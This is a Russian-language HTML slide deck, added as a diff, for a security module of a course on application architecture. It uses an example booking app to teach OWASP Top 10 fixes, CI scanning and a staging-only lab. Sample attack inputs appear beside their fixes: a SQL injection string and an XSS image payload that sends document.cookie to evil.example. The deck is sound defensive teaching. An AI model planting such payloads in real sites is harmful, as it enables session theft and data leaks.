@@ -1,0 +1,330 @@
+<!doctype html>
+<html lang="ru">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+<title>Модуль 10 — Безопасность</title>
+<link rel="stylesheet" href="../../assets/deck.css">
+</head>
+<body>
+<div class="progress" id="deck-progress"></div>
+<main class="deck">
+
+<section class="slide" data-layout="title">
+  <p class="kicker">Модуль 10</p>
+  <h1>Безопасность</h1>
+  <h2>Перед выходом в интернет: смотрим на «Slot» глазами атакующего</h2>
+  <p class="course">Архитектура современных приложений: от идеи до живого продукта</p>
+</section>
+
+<section class="slide">
+  <h2>План занятия</h2>
+  <ul>
+    <li>Почему это важно уже сейчас; модель угроз</li>
+    <li>OWASP Top 10 на примерах «Slot»</li>
+    <li>Контроль доступа, инъекции, XSS, CSRF и CORS</li>
+    <li>Аутентификация, конфигурация, заголовки безопасности</li>
+    <li>Злоупотребление бизнес-логикой</li>
+    <li>Цепочка поставок и персональные данные</li>
+    <li>Логи, ошибки, безопасность в CI; лабораторная</li>
+  </ul>
+</section>
+
+<section class="slide">
+  <h2>Цели обучения</h2>
+  <ul>
+    <li>Строить <strong>модель угроз</strong>: что ценно, где точки входа, кто атакует</li>
+    <li>Узнавать и исправлять самые частые уязвимости (OWASP Top 10)</li>
+    <li>Безопасно настраивать аутентификацию, сессии, заголовки и секреты</li>
+    <li>Встраивать проверки безопасности в CI</li>
+  </ul>
+</section>
+
+<section class="slide">
+  <h2>Почему уже сейчас</h2>
+  <ol class="trace-log">
+    <li><span class="tag plan">00:00</span> сервер получил IP и домен</li>
+    <li><span class="tag danger">00:04</span> первый скан портов: 22, 5432, 6379…</li>
+    <li><span class="tag danger">00:15</span> перебор SSH-паролей: root/123456, admin/admin</li>
+    <li><span class="tag danger">01:00</span> запросы к <code>/.env</code>, <code>/.git/config</code>, <code>/wp-admin</code></li>
+  </ol>
+  <ul>
+    <li>Атакуют не вас лично, а <strong>всех подряд</strong> — автоматически</li>
+    <li>У «Slot» есть что украсть: <strong>телефоны клиентов</strong>, аккаунт мастера, возможность сорвать запись</li>
+  </ul>
+  <blockquote>Безопасность — процесс: модель угроз → защиты → проверки → мониторинг.</blockquote>
+</section>
+
+<section class="slide">
+  <h2>Модель угроз</h2>
+  <p>Три вопроса: <strong>что защищаем</strong>, <strong>где вход</strong>, <strong>кто атакует</strong>.</p>
+  <table>
+    <tr><th>Актив «Slot»</th><th>Точка входа</th><th>Атакующий</th></tr>
+    <tr><td>Телефоны и имена клиентов</td><td>API записей, админка</td><td>Сборщик баз, любопытный клиент</td></tr>
+    <tr><td>Аккаунт мастера</td><td>Форма входа, сброс пароля</td><td>Перебор паролей, фишинг</td></tr>
+    <tr><td>Расписание и записи</td><td>API бронирования</td><td>Конкурент, бот, «шутник»</td></tr>
+    <tr><td>Сервер и БД</td><td>SSH, порты, зависимости</td><td>Автоматические сканеры</td></tr>
+  </table>
+  <p><strong>STRIDE</strong> как чек-лист: подмена личности · изменение данных · отказ от действий · утечка · отказ в обслуживании · повышение прав.</p>
+</section>
+
+<section class="slide">
+  <h2>OWASP Top 10 (редакция 2025) на примерах «Slot»</h2>
+  <table style="font-size:.86rem">
+    <tr><th>#</th><th>Категория</th><th>Пример в «Slot»</th></tr>
+    <tr><td>A01</td><td><strong>Нарушение контроля доступа</strong></td><td><code>GET /api/bookings/1017</code> отдаёт чужую запись</td></tr>
+    <tr><td>A02</td><td>Ошибки конфигурации</td><td><code>DEBUG=True</code>, открытый порт PostgreSQL</td></tr>
+    <tr><td>A03</td><td>Цепочка поставок ПО</td><td>Уязвимая или вредоносная зависимость</td></tr>
+    <tr><td>A04</td><td>Криптографические ошибки</td><td>Пароли в открытом виде или в MD5</td></tr>
+    <tr><td>A05</td><td>Инъекции</td><td>SQL-инъекция в поиске, XSS в отзыве</td></tr>
+    <tr><td>A06</td><td>Небезопасный дизайн</td><td>Нет лимита записей — бот занимает все слоты</td></tr>
+    <tr><td>A07</td><td>Ошибки аутентификации</td><td>Перебор паролей, нет MFA у админа</td></tr>
+    <tr><td>A08</td><td>Целостность ПО и данных</td><td>Неподписанные вебхуки, непроверенные артефакты в CI</td></tr>
+    <tr><td>A09</td><td>Логирование и алерты</td><td>Атаку никто не заметил</td></tr>
+    <tr><td>A10</td><td>Обработка исключительных ситуаций</td><td>Стектрейс в ответе, «при ошибке — пропустить проверку»</td></tr>
+  </table>
+</section>
+
+<section class="slide">
+  <h2>A01: контроль доступа и IDOR</h2>
+  <div class="compare">
+    <div class="card before">
+      <h4>Перебор id — и видны чужие записи</h4>
+      <pre><code style="font-size:.74rem">@app.get("/api/bookings/{booking_id}")
+async def get_booking(booking_id: int):
+    return await repo.get_booking(booking_id)</code></pre>
+    </div>
+    <div class="card after">
+      <h4>Проверяем владельца</h4>
+      <pre><code style="font-size:.74rem">@app.get("/api/bookings/{booking_id}")
+async def get_booking(
+        booking_id: int,
+        user: User = Depends(current_user)):
+    booking = await repo.get_booking(booking_id)
+    if booking is None or not user.can_view(booking):
+        raise HTTPException(404)
+    return booking</code></pre>
+    </div>
+  </div>
+  <p>«Залогинен» ≠ «имеет право на этот объект». <code>404</code>, а не <code>403</code>: не подтверждаем, что запись существует.</p>
+</section>
+
+<section class="slide">
+  <h2>A05: SQL-инъекция</h2>
+  <div class="compare" style="grid-template-columns:1fr">
+    <div class="card before">
+      <h4>Ввод пользователя становится частью SQL</h4>
+      <pre><code style="font-size:.82rem">await db.fetch(f"SELECT * FROM bookings WHERE client_phone = '{phone}'")
+<span class="del"># phone = "' OR '1'='1"  →  все записи всех клиентов</span></code></pre>
+    </div>
+    <div class="card after">
+      <h4>Параметризованный запрос: ввод отдельно от SQL</h4>
+      <pre><code style="font-size:.82rem">await db.fetch("SELECT * FROM bookings WHERE client_phone = $1", phone)</code></pre>
+    </div>
+  </div>
+  <p>ORM параметризуют сами — опасны «сырые» строки и <code>f"..."</code> в SQL. То же для командной строки.</p>
+</section>
+
+<section class="slide">
+  <h2>A05: XSS — чужой скрипт на вашей странице</h2>
+  <pre><code style="font-size:.85rem"><span style="color:var(--fg-dim)">Отзыв клиента:</span>
+<span class="del">&lt;img src=x onerror="fetch('https://evil.example/?c='+document.cookie)"&gt;</span></code></pre>
+  <ul>
+    <li>React и Vue <strong>экранируют</strong> вывод — опасны <code>dangerouslySetInnerHTML</code>, <code>v-html</code>, Markdown → HTML без очистки</li>
+    <li>Ответ LLM (Модуль 7) — тоже недоверенный ввод</li>
+    <li>Очистка HTML — DOMPurify; на сервере — проверка и ограничение формата</li>
+    <li><strong>Content Security Policy</strong> — второй рубеж: браузер не выполнит скрипт с чужого домена</li>
+  </ul>
+</section>
+
+<section class="slide">
+  <h2>CSRF, cookie и CORS</h2>
+  <div class="svg-scene">
+    <svg viewBox="0 0 860 170" xmlns="http://www.w3.org/2000/svg" style="width:860px">
+      <defs><marker id="s0" markerWidth="8" markerHeight="8" refX="7" refY="4" orient="auto"><path d="M0,0 L8,4 L0,8 z" fill="var(--fg-dim)"/></marker></defs>
+      <rect x="10" y="60" width="170" height="50" rx="10" fill="var(--card)" stroke="var(--danger)" stroke-width="2"/>
+      <text x="95" y="90" text-anchor="middle" fill="var(--danger)" font-size="14" font-weight="700">evil.example</text>
+      <rect x="320" y="60" width="200" height="50" rx="10" fill="var(--card)" stroke="var(--accent)" stroke-width="2"/>
+      <text x="420" y="82" text-anchor="middle" fill="var(--accent)" font-size="14" font-weight="700">Браузер пользователя</text>
+      <text x="420" y="100" text-anchor="middle" fill="var(--fg-dim)" font-size="11">cookie сессии slot.example</text>
+      <rect x="660" y="60" width="190" height="50" rx="10" fill="var(--card)" stroke="var(--accent-2)" stroke-width="2"/>
+      <text x="755" y="90" text-anchor="middle" fill="var(--accent-2)" font-size="14" font-weight="700">API «Slot»</text>
+      <line x1="180" y1="85" x2="316" y2="85" stroke="var(--danger)" stroke-width="2" marker-end="url(#s0)"/>
+      <text x="248" y="76" text-anchor="middle" fill="var(--danger)" font-size="11">скрытая форма</text>
+      <line x1="520" y1="85" x2="656" y2="85" stroke="var(--danger)" stroke-width="2" marker-end="url(#s0)"/>
+      <text x="588" y="76" text-anchor="middle" fill="var(--danger)" font-size="11">POST + cookie</text>
+      <text x="430" y="150" text-anchor="middle" fill="var(--accent-2)" font-size="13">SameSite=Lax/Strict + CSRF-токен → запрос с чужого сайта без cookie</text>
+    </svg>
+  </div>
+  <ul>
+    <li>Cookie сессии: <code>HttpOnly</code>, <code>Secure</code>, <code>SameSite</code>; изменения — только <code>POST</code>/<code>PATCH</code>/<code>DELETE</code></li>
+    <li><strong>CORS</strong> — только свои домены; <code>*</code> вместе с cookie — ошибка. CORS <strong>не защищает сервер</strong>: <code>curl</code> его игнорирует</li>
+  </ul>
+</section>
+
+<section class="slide">
+  <h2>A07: аутентификация</h2>
+  <table>
+    <tr><th>Что</th><th>Как правильно</th></tr>
+    <tr><td>Хранение паролей</td><td><strong>argon2id</strong> (или bcrypt), никогда MD5/SHA без соли</td></tr>
+    <tr><td>Перебор</td><td>Лимит попыток на аккаунт и IP, растущая задержка</td></tr>
+    <tr><td>Администраторы</td><td><strong>MFA</strong> обязательно</td></tr>
+    <tr><td>Сессии и токены</td><td>Короткий срок жизни; выход аннулирует сессию</td></tr>
+    <tr><td>Сброс пароля</td><td>Одноразовый токен на 15–30 минут; не сообщать, существует ли email</td></tr>
+    <tr><td>Без паролей</td><td>Вход через Telegram, Яндекс ID, Google (OAuth/OIDC) или код по SMS</td></tr>
+  </table>
+</section>
+
+<section class="slide">
+  <h2>A02: ошибки конфигурации</h2>
+  <ol class="trace-log">
+    <li><span class="tag danger">Отладка</span> <code>DEBUG=True</code> в продакшене → стектрейсы и настройки видны всем</li>
+    <li><span class="tag danger">Пароли</span> по умолчанию: <code>postgres/postgres</code>, <code>admin/admin</code></li>
+    <li><span class="tag danger">Порты</span> PostgreSQL, Redis, панель Docker открыты в интернет</li>
+    <li><span class="tag danger">Файлы</span> открытый <code>/.env</code>, <code>/.git</code> в корне сайта</li>
+    <li><span class="tag danger">Ошибки</span> «пользователь не найден» vs «неверный пароль» — подсказка для перебора</li>
+  </ol>
+  <p>Проверка: <code>nmap</code> своего сервера снаружи — открыты должны быть только 22, 80, 443.</p>
+</section>
+
+<section class="slide">
+  <h2>Заголовки безопасности</h2>
+  <div class="compare" style="grid-template-columns: 1.25fr 1fr; align-items:start">
+    <pre style="margin:0"><code style="font-size:.7rem;line-height:1.35">slot.example {
+    header {
+        Strict-Transport-Security
+          "max-age=31536000; includeSubDomains"
+        Content-Security-Policy
+          "default-src 'self'; img-src 'self' data:;
+           frame-ancestors 'none'"
+        X-Content-Type-Options "nosniff"
+        Referrer-Policy
+          "strict-origin-when-cross-origin"
+        -Server
+    }
+    reverse_proxy web:3000
+}</code></pre>
+    <table style="font-size:.88rem">
+      <tr><th>Заголовок</th><th>Защищает от</th></tr>
+      <tr><td>HSTS</td><td>Подмены HTTPS на HTTP</td></tr>
+      <tr><td>CSP</td><td>XSS, чужих скриптов, встраивания во фрейм</td></tr>
+      <tr><td><code>nosniff</code></td><td>Выполнения файла не того типа</td></tr>
+      <tr><td>Referrer-Policy</td><td>Утечки адресов страниц</td></tr>
+    </table>
+  </div>
+</section>
+
+<section class="slide">
+  <h2>A06: злоупотребление бизнес-логикой</h2>
+  <blockquote>Бот за минуту записывается на <strong>все</strong> слоты пятницы на вымышленные номера. Ни одной «уязвимости» — всё по API.</blockquote>
+  <div class="trio">
+    <div class="card"><h4>Лимиты</h4><p>Не больше 2 активных записей на телефон; лимиты на IP и устройство.</p></div>
+    <div class="card"><h4>Подтверждение</h4><p>Код в Telegram или SMS; автоотмена неподтверждённых через 15 минут.</p></div>
+    <div class="card"><h4>Наблюдение</h4><p>Капча — только при аномалиях; алерт мастеру при всплеске записей.</p></div>
+  </div>
+  <p><em>Такие угрозы находит модель угроз, а не сканер.</em></p>
+</section>
+
+<section class="slide">
+  <h2>A03: цепочка поставок</h2>
+  <ul>
+    <li>90% кода вашего приложения — <strong>чужие пакеты</strong></li>
+    <li><strong>Lock-файлы</strong> и фиксированные версии; хэши пакетов (<code>uv lock</code>, <code>pip --require-hashes</code>, <code>package-lock.json</code>)</li>
+    <li><strong>pip-audit</strong>, <strong>npm audit</strong>, Dependabot / Renovate — известные уязвимости и PR с обновлениями</li>
+    <li><strong>Trivy</strong> — уязвимости в образах; <strong>SBOM</strong> (Syft) — список всего, что внутри</li>
+  </ul>
+  <div class="compare" style="grid-template-columns:1fr">
+    <div class="card before"><h4>Slopsquatting</h4><p>ИИ-агент советует пакет, которого не существует, — злоумышленник регистрирует это имя. Перед установкой проверяйте, что пакет реальный и популярный.</p></div>
+  </div>
+</section>
+
+<section class="slide">
+  <h2>Персональные данные</h2>
+  <div class="trio">
+    <div class="card"><h4>Минимизация</h4><p>Для записи хватит имени и телефона. Не собирайте лишнего.</p></div>
+    <div class="card"><h4>Шифрование</h4><p>При передаче — TLS; при хранении — шифрование диска или БД; бэкапы — тоже.</p></div>
+    <div class="card"><h4>Логи</h4><p>Маскирование: <code>+7******4567</code>. Никаких токенов и паролей.</p></div>
+  </div>
+  <ul>
+    <li><strong>Сроки хранения:</strong> удалять или обезличивать старые записи</li>
+    <li><strong>Доступ сотрудников</strong> — по необходимости и с журналом; требования закона — Модуль 12</li>
+  </ul>
+</section>
+
+<section class="slide">
+  <h2>Логи, алерты и ошибки</h2>
+  <ul>
+    <li>Логируйте: входы и неудачи, отказы в доступе, действия администраторов, смену настроек</li>
+    <li>Алерты: всплеск <code>401</code>/<code>403</code>, много неудачных входов, резкий рост записей</li>
+    <li>Клиенту — <strong>общее сообщение</strong> и <code>request_id</code>; подробности — только в логах</li>
+    <li><strong>Fail closed:</strong> если проверка прав упала с ошибкой — доступ запрещён, а не разрешён</li>
+  </ul>
+  <pre><code style="font-size:.85rem">{"type": "https://slot.example/errors/internal", "title": "Что-то пошло не так",
+ "status": 500, "request_id": "7f3a9c"}</code></pre>
+</section>
+
+<section class="slide">
+  <h2>Безопасность в CI</h2>
+  <div class="flow-loop">
+    <div class="flow-step" style="--c:var(--accent);min-width:0;padding:.8rem 1rem"><span class="flow-label" style="font-size:1rem">gitleaks</span><span class="flow-desc">секреты в коммитах</span></div>
+    <div class="flow-arrow">→</div>
+    <div class="flow-step" style="--c:var(--accent);min-width:0;padding:.8rem 1rem"><span class="flow-label" style="font-size:1rem">Semgrep</span><span class="flow-desc">опасные паттерны (SAST)</span></div>
+    <div class="flow-arrow">→</div>
+    <div class="flow-step" style="--c:var(--accent-3);min-width:0;padding:.8rem 1rem"><span class="flow-label" style="font-size:1rem">pip-audit · npm audit</span><span class="flow-desc">уязвимые пакеты</span></div>
+    <div class="flow-arrow">→</div>
+    <div class="flow-step" style="--c:var(--accent-3);min-width:0;padding:.8rem 1rem"><span class="flow-label" style="font-size:1rem">Trivy</span><span class="flow-desc">уязвимости в образе</span></div>
+    <div class="flow-arrow">→</div>
+    <div class="flow-step" style="--c:var(--accent-2);min-width:0;padding:.8rem 1rem"><span class="flow-label" style="font-size:1rem">ZAP</span><span class="flow-desc">работающий staging (DAST)</span></div>
+  </div>
+  <blockquote>Проверка падает → PR не сливается. Ложные срабатывания разбирают и помечают, а не отключают проверку целиком.</blockquote>
+</section>
+
+<section class="slide">
+  <h2>Безопасность и ИИ-агенты</h2>
+  <ol class="trace-log">
+    <li><span class="tag plan">Ревью</span> код агента проверяется так же строго, как код стажёра</li>
+    <li><span class="tag danger">Ловушка</span> агенты «чинят» падающую проверку, отключая её или ослабляя правило</li>
+    <li><span class="tag danger">Секреты</span> агент может записать ключ в лог, тест или коммит — gitleaks ловит это в CI</li>
+    <li><span class="tag danger">Инъекции</span> инструкции в issue, README или зависимостях — данные, а не команды</li>
+    <li><span class="tag obs">Польза</span> агент хорошо ищет уязвимости по чек-листу — но каждую находку проверяйте</li>
+  </ol>
+</section>
+
+<section class="slide">
+  <h2>Лабораторная работа</h2>
+  <ol>
+    <li>Модель угроз «Slot» на одну страницу</li>
+    <li><strong>Только на своём staging</strong>, в паре: IDOR, SQL-инъекция, XSS через отзыв, перебор пароля, массовая запись скриптом</li>
+    <li>Базовое сканирование <strong>OWASP ZAP</strong>; исправьте находки, добавьте заголовки и лимиты</li>
+    <li>В CI: gitleaks, Semgrep, pip-audit/npm audit, Trivy</li>
+    <li><strong>С агентом:</strong> проверка по чек-листу OWASP и тесты, воспроизводящие каждую уязвимость до исправления; каждую находку проверьте сами</li>
+  </ol>
+</section>
+
+<section class="slide">
+  <h2>Результат</h2>
+  <ul>
+    <li>Модель угроз</li>
+    <li>Журнал атак: что пробовали, что прошло, как исправили</li>
+    <li>Отчёт ZAP до и после</li>
+    <li>CI-пайплайн с проверками безопасности</li>
+  </ul>
+</section>
+
+<section class="slide" data-layout="divider">
+  <p class="num">→ 11</p>
+  <h2>Далее: Инфраструктура</h2>
+  <p>Модель угроз первым делом. Права — на каждом запросе; ввод — параметризовать и экранировать. Злоупотребление логикой находит модель угроз, а не сканер. Проверки безопасности — в CI.</p>
+  <p><em>Дальше выводим «Slot» в интернет на своём домене.</em></p>
+</section>
+
+</main>
+<div class="hud">
+  <button class="nav-btn" data-nav="prev" aria-label="Назад">‹</button>
+  <span id="deck-counter" class="counter"></span>
+  <button class="nav-btn" data-nav="next" aria-label="Вперёд">›</button>
+  <button class="nav-btn" data-nav="fullscreen" aria-label="Полный экран">⛶</button>
+</div>
+<script src="../../assets/deck.js"></script>
+</body>
+</html>
